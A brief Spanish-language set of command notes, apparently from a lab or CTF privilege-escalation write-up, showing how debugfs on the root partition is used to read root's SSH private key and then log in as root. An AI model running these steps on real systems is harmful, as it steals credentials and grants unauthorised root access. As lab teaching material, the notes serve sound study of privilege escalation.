...
```bash 
Paso 1:
❯ lsblk     # Buscar la partición raíz 
...
```bash 
Paso 2:
# Ingresar al disco de la raíz con debugfs  
❯ debugfs /dev/sda2
	❯ debugfs: cd /root/.ssh    # Ir al directorio raíz 
	❯ debugfs: ls               # Mirar el contenido 
		❯ q                     # Salir del paginador 
	❯ debugfs: cat id_rsa       # Mostrar la llave privada 
	❯ debugfs: quit             # Salir de debugfs 
```

```bash 
Paso 3:
❯ nvim root_id_rsa              # Copiar la clave privada de root
❯ chmod 600 root_id_rsa         # Permisos al archivo 
❯ ssh -i root_id_rsa root@IP    # Ingresar como root 
```
